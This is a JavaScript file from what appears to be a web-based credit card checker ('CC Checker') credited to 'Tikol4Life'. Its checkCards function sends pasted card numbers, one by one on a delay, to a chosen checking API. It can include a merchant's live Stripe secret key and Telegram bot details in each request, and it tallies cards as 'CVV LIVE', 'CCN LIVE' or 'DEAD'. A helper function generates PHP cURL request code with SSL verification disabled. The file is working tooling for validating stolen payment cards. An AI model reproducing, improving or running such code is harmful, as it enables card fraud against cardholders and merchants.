$(document).ready(function(){
    
});
function generate(){
    var r_url = $("#r_url").val();
    var r_method = $("#r_method").val();
    var r_headers = $("#r_headers").val();
    var r_formdata = $("#r_formdata").val();

    if (r_url.length == 0 || r_method.length == 0 || r_headers.length == 0 || r_formdata.length == 0) {
        $('#Modal').modal('show');
        $('#ModalTitle').text("REQ GENERATOR");
        $('#ModalMsg').text("Error: Missing fields detected.");
        playError();
        return;
    }

    $("#r_results").text("<?php");


    $("#r_results").text("$ch = curl_init();\n");
    $("#r_results").append("curl_setopt($ch, CURLOPT_URL, '"+ r_url +"');\n");
    if(r_method == "POST"){
        $("#r_results").append("curl_setopt($ch, CURLOPT_POST, 1);\n");
    }else{
        $("#r_results").append("curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');\n");
    }
    $("#r_results").append("$headers = array();\n");
    var r_header = r_headers.split("\n");
    r_header.forEach(function(value, index) {
        $("#r_results").append("$headers[] = '"+value+"';\n");
    });
    $("#r_results").append("curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);\n");
    $("#r_results").append("curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n");
    $("#r_results").append("curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n");
    $("#r_results").append("curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);\n");
    $("#r_results").append("curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);\n");
    $("#r_results").append("curl_setopt($ch, CURLOPT_POSTFIELDS, '"+ r_formdata +"');\n");
    $("#r_results").append("$curl = curl_exec($ch);\n");
    $("#r_results").append("curl_close($ch);\n");
    $("#r_results").append("echo $curl;");
    

}


function save_content_to_file(content, filename){
    var dlg = false;
    with(document){
     ir=createElement('iframe');
     ir.id='ifr';
     ir.location='about.blank';
     ir.style.display='none';
     body.appendChild(ir);
      with(getElementById('ifr').contentWindow.document){
           open("text/plain", "replace");
           charset = "utf-8";
           write(content);
           close();
           document.charset = "utf-8";
           dlg = execCommand('SaveAs', false, filename);
       }
       body.removeChild(ir);
     }
    return dlg;
}


function checkCards() {
    var line = $("#cards").val();
    var line = line.replace(/^\s*[\r\n]/gm, '');
    $("#cards").val(line);
    
    var apis = $("#api").val();
    var api_selected = $("#api option:selected").text();
    var sk_live = $("#sk").val();

    var tele_msg = $("#tele_msg").val();
    var delay = $("#delay").val();

    if (line.length == 0){
        $('#Modal').modal('show');
        $('#ModalTitle').text("CC Checker");
        $('#ModalMsg').text("Error: Cards form empty.");
        playError();
        return;
    }
    if(api_selected.includes("need SK")){
        if (sk_live.length == 0) {
            $('#Modal').modal('show');
            $('#ModalTitle').text("SK Checker");
            $('#ModalMsg').text("Error: Secret Key (SK) form empty.");
            playError();
            return;
        }
        if (sk_live.indexOf('sk_live')==-1){
            $('#Modal').modal('show');
            $('#ModalTitle').text("SK Checker");
            $('#ModalMsg').text("Error: Secret Key (SK) provided is invalid.");
            playError();
            return;
        }
    }
    if(api_selected.includes("need SK")){
        var sk_live = $("#sk").val();
    }else{
        var sk_live = "";
    }

    var telebot = $("#telebot").val();

    if(telebot.length == 0) {
        var telebot = "";
    }

	playClick();
    var check_line = line.split("\n");
    var total = check_line.length;
    credits();
    check_line.forEach(function(value, index) {
        setTimeout(
            function(){
                $.ajax({
                    url: apis + '?cc_info=' + value + '&sk=' + sk_live + '&referrer=Tikol4Life&telebot=' + telebot + "&tele_msg=" + tele_msg,
                    type: 'GET',
                    async: true,
                    success: function(results) {
                        var count_live_cvv = (eval(document.getElementById("approved_counter_cvv").innerHTML) + 1);
                        var count_live_ccn = (eval(document.getElementById("approved_counter_ccn").innerHTML) + 1);
                        var count_dead = (eval(document.getElementById("decline_counter").innerHTML) + 1);
                        remove_line();
                        if(results.match("CVV LIVE")) {
                            $("#approved_counter_cvv").text(count_live_cvv);
                            playSuccess();
                        }else if(results.match("CCN LIVE")){
                            $("#approved_counter_ccn").text(count_live_ccn);
                            playSuccess();
                        }else if(results.match("DEAD")){
                            $("#decline_counter").text(count_dead);
                        }
                        result(results + "");
                    }
                });
            }, delay * index
        );
    });
}

function credits(){
    if(!$("#footer").length){
        $("#container").append('<div class="footer" id="footer"><center><p style="color: #FFFFFF">Tikol4Life</p></center></div>');
    }else{
    	var x = document.getElementById("footer").textContent;
    	if (x != 'Tikol4Life') {
    		$("#container").append('<div class="footer" id="footer"><center><p style="color: #FFFFFF">Tikol4Life</p></center></div>');
    	}
    }
}
function playClick() {
    var audio = document.getElementById("click");
    audio.play();
}
function playError() {
    var audio = document.getElementById("error");
    audio.play();
}
function playSuccess() {
    var audio = document.getElementById("success");
    audio.play();
}